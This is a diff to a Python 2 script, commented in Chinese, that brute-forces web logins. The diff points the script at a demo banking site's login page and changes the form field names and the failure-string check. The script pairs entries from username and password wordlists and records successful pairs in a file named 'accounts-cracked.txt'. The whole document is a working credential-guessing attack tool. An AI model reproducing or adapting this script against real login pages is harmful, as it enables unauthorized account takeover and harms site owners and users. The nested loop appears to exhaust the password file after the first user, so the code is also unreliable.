@@ -17,7 +17,7 @@ def tryUser(user, password):
     # print user,password
     global headers
     global outFile
-    conn = httplib.HTTPConnection("www.xxxxx.com")  # 远程域名
+    conn = httplib.HTTPConnection("demo.testfire.net")  # 远程域名
     if len(user) < 3:  # 限制用户名长度，排除字典中的无用数据
         return  # 主动退出线程
     else:
@@ -29,11 +29,12 @@ def tryUser(user, password):
 
         user = user.strip()
         passwd = password.strip()
-        params = urllib.urlencode({'username': user, 'password': passwd})
-        conn.request(method="POST", url="/users/login", body=params, headers=headers)  # 后台路径
+        params = urllib.urlencode({'uid': user, 'passw': passwd,'btnSubmit':'Login'})
+        conn.request(method="POST", url="/bank/login.aspx", body=params, headers=headers)  # 后台路径
         responseText = conn.getresponse().read().decode('utf8')  # 网页编码
         # print responseText  # 第一次可以打印看看是否解析
-        if not responseText.find(u'用户名或者密码不正确,请重新输入!') > 0:
+        if not responseText.find(u'Login Failed: Your password appears to be invalid. \n'
+                                 u'Please re-enter your password carefully.') > 0:
             print '----- find user:', user, 'with password:', passwd, '-----'
             outFile.write(user + '    ' + passwd + '\n')
 
@@ -44,7 +45,8 @@ outFile = open('accounts-cracked.txt', 'w')
 
 if __name__ == '__main__':
     tsk = []  # 创建线程池
-    with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭(类似C# 中的using(...){}接口)
+    with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭
+        # (类似C# 中的using(...){}接口)
         with open(r'pass.dic', 'r') as fPass:
             for user in fUser.readlines():
                 for password in fPass.readlines():
